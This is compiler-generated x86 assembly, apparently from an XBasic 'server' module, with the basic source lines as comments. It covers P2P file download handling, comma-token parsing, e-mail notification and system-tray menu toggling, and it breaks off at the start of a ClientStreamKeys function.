#ifdef ClientDownload.file
#undef ClientDownload.file
#endif
#define ClientDownload.file ebp-44	; exposes local variable 'file'
;
;
; [2207] TP2P p2p
#ifdef ClientDownload.p2p
#undef ClientDownload.p2p
#endif
#define ClientDownload.p2p ebp-48	; exposes local variable 'p2p'
;
;
; [2209] IF WaitForSingleObject (#hsmDownL,300000) == $$WAIT_TIMEOUT THEN
	push	300000			;;; i656a
	push	[%#hsmDownL.server]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.00D9.server			;;; i219
;
; [2210] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func34.server			;;; i258
;
; [2211] END IF
else.00D9.server:
end.if.00D9.server:
;
; [2213] IF newP2P(@p2p) THEN
	mov	eax,d[ebp-48]			;;; i665
	push	eax			;;; i667a
	call	_newP2P@4			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.00DA.server			;;; i221
;
; [2214] auths$ = GetTokenEx (@text,',',0)
#ifdef ClientDownload.auths$
#undef ClientDownload.auths$
#endif
#define ClientDownload.auths$ ebp-52	; exposes local variable 'auths$'
;
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2215] addr$ = GetTokenEx (@text,',',0)
#ifdef ClientDownload.addr$
#undef ClientDownload.addr$
#endif
#define ClientDownload.addr$ ebp-56	; exposes local variable 'addr$'
;
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	lea	ebx,[ebp-56]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2216] port = ULONG(GetTokenEx (@text,',',0))
#ifdef ClientDownload.port
#undef ClientDownload.port
#endif
#define ClientDownload.port ebp-60	; exposes local variable 'port'
;
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-60],eax			;;; i670
;
; [2217] file.auth = @p2p.GetAdler(&auths$,LEN(auths$))
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+12]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.309			;;; i604
; .xstk34.0000 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-52]			;;; i642
; .xstk34.0001 = ebp-76	; internal variable
	mov	d[ebp-76],eax			;;; i670
	mov	eax,d[ebp-52]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.310			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.310:
	push	eax			;;; i667a
	push	[ebp-76]			;;; i674a
	mov	eax,d[ebp-68]			;;; i665
	call	eax			;;; i620
A.309:
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+3],eax			;;; i13b
;
; [2218] file.srcfile = GetTokenEx (@text,',',0)
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	ebx,d[ebp-44]			;;; i665
	lea	edi,[ebx+7]			;;; i9b
	mov	esi,eax			;;; i10
	mov	ecx,255			;;; i11
	call	%_assignCompositeStringlet.s			;;; i12
;
; [2219] file.desfile = GetTokenEx (@text,',',0)
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	ebx,d[ebp-44]			;;; i665
	lea	edi,[ebx+262]			;;; i9b
	mov	esi,eax			;;; i10
	mov	ecx,255			;;; i11
	call	%_assignCompositeStringlet.s			;;; i12
;
; [2220] file.start = ULONG(GetTokenEx (@text,',',0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+517],eax			;;; i13b
;
; [2221] file.end = ULONG(GetTokenEx (@text,',',0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	44			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+521],eax			;;; i13b
;
; [2222] file.flags = ULONG(GetTokenEx (@text,0,0))
	sub	esp,64			;;; i487
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+8],ecx			;;; i670
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.s			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[ebp-44]			;;; i665
	mov	b[ebx+538],al			;;; i13b
;
; [2223] file.blocks = 0'use default block size
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+533],ebx			;;; i13b
;
; [2225] ret = @p2p.FileDownload (file,addr$,port)
#ifdef ClientDownload.ret
#undef ClientDownload.ret
#endif
#define ClientDownload.ret ebp-80	; exposes local variable 'ret'
;
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.311			;;; i604
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i665
; .compositeArg.0 = ebp-84	; internal variable
	mov	edi,d[ebp-84]			;;; i665
	mov	esi,eax			;;; i660
	mov	ecx,540			;;; i606a
	mov	eax,edi			;;; i606b
	call	%_assignComposite			;;; i607
	mov	d[ebp-76],eax			;;; i670
	mov	eax,d[ebp-56]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk34.0002 = ebp-92	; internal variable
	mov	d[ebp-92],eax			;;; i670
	push	[ebp-60]			;;; i674a
	push	[ebp-92]			;;; i674a
	push	[ebp-76]			;;; i674a
	mov	eax,d[ebp-68]			;;; i665
	call	eax			;;; i620
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
A.311:
	mov	d[ebp-80],eax			;;; i670
;
; [2226] @p2p.Free(p2p)
	mov	eax,d[ebp-48]			;;; i665
	mov	eax,d[eax+20]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.312			;;; i604
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-48]			;;; i665
; .compositeArg.1 = ebp-96	; internal variable
	mov	edi,d[ebp-96]			;;; i665
	mov	esi,eax			;;; i660
	mov	ecx,28			;;; i606a
	mov	eax,edi			;;; i606b
	call	%_assignComposite			;;; i607
	push	eax			;;; i667a
	mov	eax,d[ebp-68]			;;; i665
	call	eax			;;; i620
A.312:
;
; [2227] ELSE
	jmp	end.if.00DA.server			;;; i107
else.00DA.server:
;
; [2228] ret = $$FALSE
	mov	eax,0			;;; i659
	mov	d[ebp-80],eax			;;; i670
;
; [2229] END IF
end.if.00DA.server:
;
; [2231] ReleaseSemaphore (#hsmDownL,1,NULL)
#ifdef ClientDownload.NULL
#undef ClientDownload.NULL
#endif
#define ClientDownload.NULL ebp-100	; exposes local variable 'NULL'
;
	push	[ebp-100]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmDownL.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [2232] RETURN ret
	mov	eax,d[ebp-80]			;;; i665
	jmp	end.func34.server			;;; i258
;
; [2233] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientDownload.server:  ;;; Function end label for Assembly Programmers.
end.func34.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func34.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func34.server:
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientDownload ()  *****
;  *****
;
; [2235] FUNCTION STRING GetTokenEx (str$,term,offset)
.code
;
#ifdef GetTokenEx.str$
#undef GetTokenEx.str$
#endif
#define GetTokenEx.str$ ebp+8	; exposes function argument 'str$'
;
;
#ifdef GetTokenEx.term
#undef GetTokenEx.term
#endif
#define GetTokenEx.term ebp+12	; exposes function argument 'term'
;
;
#ifdef GetTokenEx.offset
#undef GetTokenEx.offset
#endif
#define GetTokenEx.offset ebp+16	; exposes function argument 'offset'
;
align 16
_GetTokenEx.server@12:
;  *****
;  *****  FUNCTION  GetTokenEx ()  *****
;  *****
func10.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func10.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody10.server:
;
; [2238] IFZ str$ THEN RETURN ""
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.317			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00DB.server			;;; i192
A.317:
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func10.server			;;; i258
else.00DB.server:
end.if.00DB.server:
;
; [2240] len = LEN(str$)
#ifdef GetTokenEx.len
#undef GetTokenEx.len
#endif
#define GetTokenEx.len ebp-40	; exposes local variable 'len'
;
	mov	eax,d[ebp+8]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.318			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.318:
	mov	d[ebp-40],eax			;;; i670
;
; [2241] msg$=""
#ifdef GetTokenEx.msg$
#undef GetTokenEx.msg$
#endif
#define GetTokenEx.msg$ ebp-44	; exposes local variable 'msg$'
;
	xor	eax,eax			;;; i3
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2242] IF (offset >= len-1) THEN RETURN ""
	mov	eax,d[ebp-40]			;;; i665
	sub	eax,1			;;; i791
	mov	ebx,d[ebp+16]			;;; i665
	cmp	eax,ebx			;;; i684a
	jg	>> else.00DC.server			;;; i219
	xor	eax,eax			;;; i658
	call	%_clone.a0			;;; i870
	jmp	end.func10.server			;;; i258
else.00DC.server:
end.if.00DC.server:
;
; [2244] FOR p = offset TO len-1
#ifdef GetTokenEx.p
#undef GetTokenEx.p
#endif
#define GetTokenEx.p ebp-48	; exposes local variable 'p'
;
	mov	eax,d[ebp+16]			;;; i665
	mov	d[ebp-48],eax			;;; i670
	mov	eax,d[ebp-40]			;;; i665
	sub	eax,1			;;; i791
; .forlimit10.00DD = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
align 8
for.00DD.server:
	mov	eax,d[ebp-48]			;;; i665
	mov	ebx,d[ebp-52]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.00DD.server			;;; i154
;
; [2245] IF str${p} == term THEN
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	ebx,d[ebp+12]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.00DE.server			;;; i219
;
; [2246] INC p
	inc	d[ebp-48]			;;; i84
;
; [2247] str$ = RIGHT$(str$,len-p)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-40]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[esp+4],eax			;;; i887
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2248] RETURN msg$
	mov	eax,[ebp-44]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func10.server			;;; i258
;
; [2249] ELSE
	jmp	end.if.00DE.server			;;; i107
else.00DE.server:
;
; [2250] msg$ = msg$ + CHR$(str${p})
	sub	esp,64			;;; i487
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_chr.d			;;; i575
	add	esp,64			;;; i600
	mov	ebx,[ebp-44]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2251] END IF
end.if.00DE.server:
;
; [2252] NEXT p
do.next.00DD.server:
	inc	d[ebp-48]			;;; i229
	jmp	for.00DD.server			;;; i231
end.for.00DD.server:
;
; [2254] str$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2255] RETURN msg$
	mov	eax,[ebp-44]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func10.server			;;; i258
;
; [2256] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetTokenEx.server:  ;;; Function end label for Assembly Programmers.
end.func10.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func10.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
free.func10.server:
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetTokenEx ()  *****
;  *****
;
; [2259] FUNCTION ClientMailReply (socket)
.code
;
#ifdef ClientMailReply.socket
#undef ClientMailReply.socket
#endif
#define ClientMailReply.socket ebp+8	; exposes function argument 'socket'
;
align 16
_ClientMailReply.server@4:
;  *****
;  *****  FUNCTION  ClientMailReply ()  *****
;  *****
func2A.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody2A.server:
;
; [2260] SHARED STRING MailReply
;
; [2263] SendMsg (socket,"CMSG "+ConvertLFTo12 (@MailReply))
	push	[%MailReply.server]			;;; i672a
	call	func13.server			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	[%MailReply.server],ecx			;;; i668
	mov	ebx,addr @_string.0452.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2264] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func2A.server			;;; i258
;
; [2265] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientMailReply.server:  ;;; Function end label for Assembly Programmers.
end.func2A.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ClientMailReply ()  *****
;  *****
;
; [2267] FUNCTION ClientEmail (socket,file$)
.code
;
#ifdef ClientEmail.socket
#undef ClientEmail.socket
#endif
#define ClientEmail.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientEmail.file$
#undef ClientEmail.file$
#endif
#define ClientEmail.file$ ebp+12	; exposes function argument 'file$'
;
align 16
_ClientEmail.server@8:
;  *****
;  *****  FUNCTION  ClientEmail ()  *****
;  *****
func32.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.329:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.329			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,180			;;; i114a
;
funcBody32.server:
;
; [2268] STATIC message$
data section 'globals$statics'
align	4
%32%message$.server:	db 4 dup ?
.code
;
; [2271] file$ = TRIM$(file$)
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_trim.d.v			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2272] IFZ file$ THEN RETURN $$FALSE
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.325			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00DF.server			;;; i192
A.325:
	mov	eax,0			;;; i659
	jmp	end.func32.server			;;; i258
else.00DF.server:
end.if.00DF.server:
;
; [2274] message$ = ""
	xor	eax,eax			;;; i3
	mov	ebx,addr %32%message$.server			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2275] LoadString (file$,@message$)
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk32.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
	push	[%32%message$.server]			;;; i672a
	push	[ebp-44]			;;; i674a
	call	func5D.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+4]			;;; i877a
	mov	[%32%message$.server],ecx			;;; i668
	add	esp,8			;;; i633
;
; [2276] IFZ message$ THEN
	mov	eax,[%32%message$.server]			;;; i663a
	test	eax,eax			;;; i188
	jz	> A.326			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00E0.server			;;; i192
A.326:
;
; [2277] SendMsg (socket,"CMSG *** mail not sent, no data to send ***")
	mov	eax,addr @_string.0488.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2278] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func32.server			;;; i258
;
; [2279] ELSE
	jmp	end.if.00E0.server			;;; i107
else.00E0.server:
;
; [2280] _beginthreadex (NULL, 0, &EMailAlert(),&message$, 0, &tid)
#ifdef ClientEmail.NULL
#undef ClientEmail.NULL
#endif
#define ClientEmail.NULL ebp-48	; exposes local variable 'NULL'
;
	mov	eax,addr _EMailAlert.server@4			;;; i599
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[%32%message$.server]			;;; i642
; .xstk32.0001 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
#ifdef ClientEmail.tid
#undef ClientEmail.tid
#endif
#define ClientEmail.tid ebp-60	; exposes local variable 'tid'
;
	lea	eax,[ebp-60]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	[ebp-56]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	0			;;; i656a
	push	[ebp-48]			;;; i674a
	call	__beginthreadex			;;; i619
	add	esp,24			;;; i633
;
; [2281] Sleep (10)
	push	10			;;; i656a
	call	_Sleep@4			;;; i619
;
; [2282] SendMsg (socket,"CMSG *** mail sent ***")
	mov	eax,addr @_string.048B.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2283] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func32.server			;;; i258
;
; [2284] END IF
end.if.00E0.server:
;
; [2287] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientEmail.server:  ;;; Function end label for Assembly Programmers.
end.func32.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ClientEmail ()  *****
;  *****
;
; [2289] FUNCTION ClientSysMenu (socket,str$)
.code
;
#ifdef ClientSysMenu.socket
#undef ClientSysMenu.socket
#endif
#define ClientSysMenu.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientSysMenu.str$
#undef ClientSysMenu.str$
#endif
#define ClientSysMenu.str$ ebp+12	; exposes function argument 'str$'
;
align 16
_ClientSysMenu.server@8:
;  *****
;  *****  FUNCTION  ClientSysMenu ()  *****
;  *****
func33.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func33.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,192			;;; i114a
;
funcBody33.server:
;
; [2291] IFZ str$ THEN RETURN $$FALSE
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.330			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00E1.server			;;; i192
A.330:
	mov	eax,0			;;; i659
	jmp	end.func33.server			;;; i258
else.00E1.server:
end.if.00E1.server:
;
; [2292] switch$ = TRIM$(trim (str$,32))
#ifdef ClientSysMenu.switch$
#undef ClientSysMenu.switch$
#endif
#define ClientSysMenu.switch$ ebp-40	; exposes local variable 'switch$'
;
	sub	esp,64			;;; i487
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk33.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
	push	32			;;; i656a
	push	[ebp-48]			;;; i674a
	call	func12.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
	mov	d[esp],eax			;;; i887
	call	%_trim.d.s			;;; i583
	add	esp,64			;;; i600
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2294] IF switch$ == LCASE$("on") THEN
	sub	esp,64			;;; i487
	mov	eax,addr @_string.048F.server			;;; i663
	mov	d[esp],eax			;;; i887
	call	%_lcase.d.v			;;; i583
	add	esp,64			;;; i600
	mov	ebx,[ebp-40]			;;; i665
	call	%_string.compare.sv			;;; i690
	jne	>> else.00E2.server			;;; i219
;
; [2295] SendMsg (socket,"CMSG \1\2*** systray menu enabled ***")
	mov	eax,addr @_string.0490.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2296] RETURN StartMenuInit (0)
	push	0			;;; i656a
	call	func72.server			;;; i619
	jmp	end.func33.server			;;; i258
;
; [2297] END IF
else.00E2.server:
end.if.00E2.server:
;
; [2299] IF switch$ == LCASE$("off") THEN
	sub	esp,64			;;; i487
	mov	eax,addr @_string.0491.server			;;; i663
	mov	d[esp],eax			;;; i887
	call	%_lcase.d.v			;;; i583
	add	esp,64			;;; i600
	mov	ebx,[ebp-40]			;;; i665
	call	%_string.compare.sv			;;; i690
	jne	>> else.00E3.server			;;; i219
;
; [2300] SendMsg (socket,"CMSG \1\2*** systray menu disabled ***")
	mov	eax,addr @_string.0492.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2301] RETURN RemoveTrayIcon ()
	call	func70.server			;;; i619
	jmp	end.func33.server			;;; i258
;
; [2302] END IF
else.00E3.server:
end.if.00E3.server:
;
; [2304] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func33.server			;;; i258
;
; [2305] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientSysMenu.server:  ;;; Function end label for Assembly Programmers.
end.func33.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func33.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func33.server:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientSysMenu ()  *****
;  *****
;
; [2307] FUNCTION ClientStreamKeys (socket,str$)
.code
;
#ifdef ClientStreamKeys.socket
#undef ClientStreamKeys.socket
#endif
#define ClientStreamKeys.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientStreamKeys.str$
#undef ClientStreamKeys.str$
#endif
#define ClientStreamKeys.str$ ebp+12	; exposes function argument 'str$'
;
align 16
_ClientStreamKeys.server@8:
;  *****
;  *****  FUNCTION  ClientStreamKeys ()  *****
;  *****
func31.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func31.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
